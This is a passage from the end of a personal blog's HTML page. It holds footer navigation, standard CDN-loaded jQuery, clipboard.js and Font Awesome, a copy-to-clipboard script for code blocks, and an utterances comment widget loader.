       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
